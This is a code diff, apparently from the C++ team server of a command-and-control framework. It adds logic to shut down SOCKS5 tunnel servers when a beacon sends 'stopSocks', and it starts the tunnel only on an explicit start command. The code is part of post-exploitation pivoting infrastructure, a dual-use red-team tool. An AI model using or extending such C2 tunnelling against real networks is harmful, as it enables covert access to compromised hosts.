@@ -498,10 +498,24 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
     std::string dataOut;
 	while(1)
     {
+		// if session is killed (beacon probably dead) we end the server
 		if(session->isSessionKilled())
 			break;
 
 		C2Message c2Message = socksListener->getSocksTaskResult(beaconHash);
+
+		// if the beacon request stopSocks we end the server
+		if(c2Message.instruction() == Socks5 && c2Message.cmd() == "stopSocks")
+		{	
+			for(int i=0; i<socksServer.m_socksTunnelServers.size(); i++)
+				socksServer.m_socksTunnelServers[i].reset(nullptr);
+
+			socksServer.m_socksTunnelServers.erase(std::remove_if(socksServer.m_socksTunnelServers.begin(), socksServer.m_socksTunnelServers.end(),
+                             [](const std::unique_ptr<SocksTunnelServer>& ptr) { return ptr == nullptr; }),
+              socksServer.m_socksTunnelServers.end());
+
+			break;
+		}
 
         for(int i=0; i<socksServer.m_socksTunnelServers.size(); i++)
         {
@@ -682,9 +696,9 @@ grpc::Status TeamServer::SendCmdToSession(grpc::ServerContext* context, const te
 					m_logger->debug("SendCmdToSession Fail prepMsg {0}", hint);
 				}
 
-				if(c2Message.instruction() == Socks5)
+				if(c2Message.instruction() == Socks5 && c2Message.cmd() == StartCmd)
 				{
-					// TODO, start the server and launch a thread to handle socks messages
+					// start the server and launch a thread to handle socks messages
 					int port = std::atoi(c2Message.data().c_str());
 
 					std::thread t(&TeamServer::runSocksServer, this, port, listenerHash, beaconHash);
